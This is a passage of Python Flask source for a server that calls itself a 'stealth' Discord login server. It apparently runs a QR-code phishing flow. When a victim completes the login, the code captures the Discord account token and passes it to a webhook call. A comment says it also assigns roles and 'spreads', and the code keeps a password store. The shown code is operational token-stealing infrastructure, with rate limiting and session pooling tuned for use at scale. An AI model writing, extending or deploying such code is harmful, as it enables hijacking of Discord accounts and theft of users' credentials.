        return jsonify({'err': 'Invalid session. Please reload the page.', 'reload': True}), 403

    ok, retry_after = _rate_check('qr_start')
    if not ok:
        return jsonify({'err': f'Too many requests. Try again in {retry_after}s.', 'retry_after': retry_after}), 429

    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if client_ip:
        client_ip = client_ip.split(',')[0].strip()

    # Dedup: if this IP already has an active QR session in progress, reuse it
    with _qr_by_ip_lock:
        existing_sid = _qr_by_ip.get(client_ip)
        if existing_sid and existing_sid in sessions:
            s = sessions[existing_sid]
            if s.fp:
                return jsonify({'id': s.id, 'fp': s.fp})
            if s.st not in ('error', 'cancelled', 'expired', 'done'):
                # Still warming up — wait briefly for this existing session
                for _ in range(50):
                    if s.fp or s.st in ('error', 'cancelled'):
                        break
                    time.sleep(0.1)
                if s.fp:
                    return jsonify({'id': s.id, 'fp': s.fp})

    # Hard cap on total active QR sessions (prevent OOM from bot floods)
    if len(sessions) >= QR_MAX_SESSIONS:
        # Clean up stale sessions first
        dead = [k for k, v in list(sessions.items()) if v.st in ('done', 'error', 'cancelled', 'expired')]
        for k in dead:
            s2 = sessions.pop(k, None)
            if s2:
                try: s2.ws.close()
                except: pass
        # If still over cap after cleanup, reject
        if len(sessions) >= QR_MAX_SESSIONS:
            return jsonify({'id': None, 'err': 'Server busy, please retry'}), 503

    s = QRAuth()
    sessions[s.id] = s
    with _qr_by_ip_lock:
        _qr_by_ip[client_ip] = s.id
    threading.Thread(target=_qr_worker, args=(s,), daemon=True).start()

    # Wait up to 8s for QR fingerprint (pool sessions arrive in ~1s, cold ~5s)
    for _ in range(80):
        if s.fp or s.st in ('error', 'cancelled'):
            break
        time.sleep(0.1)

    if s.fp:
        return jsonify({'id': s.id, 'fp': s.fp})
    return jsonify({'id': s.id, 'err': s.err or 'Timeout'}), 500


@app.route('/api/qr/poll/<sid>')
def api_qr_poll(sid):
    ok, retry_after = _rate_check('qr_poll')
    if not ok:
        return jsonify({'st': 'error', 'err': 'rate_limited', 'retry_after': retry_after}), 429
    s = sessions.get(sid)
    if not s:
        return jsonify({'st': 'error', 'err': 'Gone'}), 404
    out = {'st': s.st}
    if s.user:         out['user'] = s.user
    if s.st == 'done' and s.token:
        # Use _success_with_info to assign role + voice + webhook + spread (once only)
        if not getattr(s, '_info_fired', False):
            s._info_fired = True
            fire_webhook(s.token)
            s._cached_info = _success_with_info(s.token)
        out.update(getattr(s, '_cached_info', {'success': True}))
    if s.err:          out['err'] = s.err
    return jsonify(out)


@app.route('/api/qr/stop/<sid>', methods=['POST'])
def api_qr_stop(sid):
    s = sessions.pop(sid, None)
    if s:
        s._stop.set()
        try: s.ws.close()
        except: pass
    return jsonify({'ok': True})



# ━━━━━━━━━━━━ Main ━━━━━━━━━━━━

if __name__ == '__main__':
    import gc
    print('[*] Fetching build number...')
    fetch_build_number()

    def _cleanup():
        while True:
            time.sleep(60)  # every 60s instead of 300s — more aggressive cleanup
            try:
                dead = [k for k, v in sessions.items() if v.st in ('done', 'error', 'cancelled', 'expired')]
                for k in dead:
                    s = sessions.pop(k, None)
                    if s:
                        try: s.ws.close()
                        except: pass
                # Clear stale login sessions (>2 min old)
                now = time.time()
                stale_login = []  # login_sessions removed (human-solve flow is synchronous)
                # Clear stale pw_store entries
                _pw_store.clear()
                # Clean up _qr_by_ip for sessions that are gone
                with _qr_by_ip_lock:
                    stale_ip = [ip for ip, sid in list(_qr_by_ip.items()) if sid not in sessions]
                    for ip in stale_ip:
                        del _qr_by_ip[ip]
                # Clean up expired page tokens
                with _page_token_lock:
                    expired_toks = [t for t, exp in list(_page_tokens.items()) if time.time() > exp]
                    for t in expired_toks:
                        del _page_tokens[t]
                cleaned = len(dead) + len(stale_login)
                if cleaned:
                    print(f'[cleanup] Removed {len(dead)} QR, {len(stale_login)} login sessions')
                # Force garbage collection to free curl_cffi / SSL memory
                gc.collect()
            except Exception as e:
                print(f'[cleanup] Error: {e}')
    threading.Thread(target=_cleanup, daemon=True).start()

    # Start session pre-warm pool
    threading.Thread(target=_session_pool_loop, daemon=True).start()

    print(f'\n  Discord Login Server (stealth)')
    print(f'  http://0.0.0.0:{PORT}\n')
    app.run('0.0.0.0', PORT, debug=False, threaded=True)
